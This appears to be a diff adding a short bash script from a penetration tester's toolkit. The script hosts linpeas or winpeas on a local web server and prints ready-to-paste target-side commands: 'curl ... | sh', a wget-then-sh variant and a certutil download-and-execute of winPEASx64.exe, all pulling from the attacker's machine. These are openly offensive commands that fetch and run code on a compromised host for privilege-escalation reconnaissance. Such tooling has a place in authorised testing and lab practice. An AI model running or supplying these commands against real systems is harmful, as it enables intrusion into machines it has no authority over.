@@ -1,0 +1,16 @@
+#!/usr/bin/env bash
+# peas [lin|win]   serve linpeas/winpeas and print the exact target-side command
+k="${1:-lin}"; d="$HOME/cyber/tools/serve"; mkdir -p "$d"
+lhost="$(~/.local/bin/hackbar vpn plain 2>/dev/null)"; [ -z "$lhost" ] && lhost="$(hostname -I|awk '{print $1}')"
+G=$'\e[38;2;158;206;106m'; B=$'\e[38;2;122;162;247m'; D=$'\e[38;2;86;95;137m'; X=$'\e[0m'
+if [ "$k" = win ]; then
+  [ -f "$d/winPEASx64.exe" ] || gettools >/dev/null 2>&1
+  echo "${B}run on TARGET (Windows):${X}"
+  echo "${G}  certutil -urlcache -f http://$lhost:8000/winPEASx64.exe wp.exe & wp.exe${X}"
+else
+  [ -f "$d/linpeas.sh" ] || gettools >/dev/null 2>&1
+  echo "${B}run on TARGET (Linux):${X}"
+  echo "${G}  curl http://$lhost:8000/linpeas.sh | sh${X}"
+  echo "${D}  or: wget http://$lhost:8000/linpeas.sh -O /tmp/lp.sh; sh /tmp/lp.sh | tee lp.txt${X}"
+fi
+echo "${B}serving $d ...${X}"; cd "$d" && exec python3 -m http.server 8000
